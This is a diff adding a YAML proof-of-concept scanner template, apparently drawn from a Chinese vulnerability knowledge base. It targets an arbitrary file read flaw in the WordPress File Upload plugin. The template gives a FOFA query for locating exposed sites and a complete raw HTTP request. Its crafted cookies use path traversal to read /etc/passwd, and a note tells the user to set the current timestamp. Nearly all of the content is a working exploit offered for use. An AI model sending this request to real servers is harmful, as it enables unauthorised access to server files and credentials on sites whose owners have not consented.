@@ -1,0 +1,40 @@
+id: poc-qc2dkbucy7wk8ot0
+info:
+  name: WordPress File Upload 插件存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qc2dkbucy7wk8ot0'
+  tags: file-upload,lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qc2dkbucy7wk8ot0
+    fofa: '"wp-content/plugins/wp-file-upload"'
+http:
+- raw:
+  - 'GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=当前时间戳; wfu_ABSPATH=/;
+
+    Connection: close
+
+
+    cookie中需指定当前时间戳
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790728943-fab115bf-0c8a-4fb2-bfbf-0804709b9010.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790729149-78858939-458b-4093-9470-720f9dc45ba7.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
